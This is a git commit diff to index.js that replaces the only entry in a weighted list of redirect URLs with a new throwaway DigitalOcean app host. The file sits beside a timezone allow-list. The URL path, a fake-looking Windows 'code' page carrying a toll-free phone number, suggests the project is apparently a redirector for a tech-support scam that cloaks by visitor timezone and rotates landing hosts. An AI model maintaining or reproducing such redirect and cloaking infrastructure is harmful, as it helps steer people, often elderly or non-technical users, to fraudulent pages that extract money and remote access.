77ce491b89b776f97120a6ca9ecd16cf47fe9d69
paalakash <palaksh452@gmail.com>
2026-06-15 13:39:09 +0530

    Update RAW_CONFIGS URLs in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://squid-app-ikb9u.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-0750", weight: 1.0 }
+    { url: "https://goldfish-app-wykcd.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-0750", weight: 1.0 }
 
 ];
 
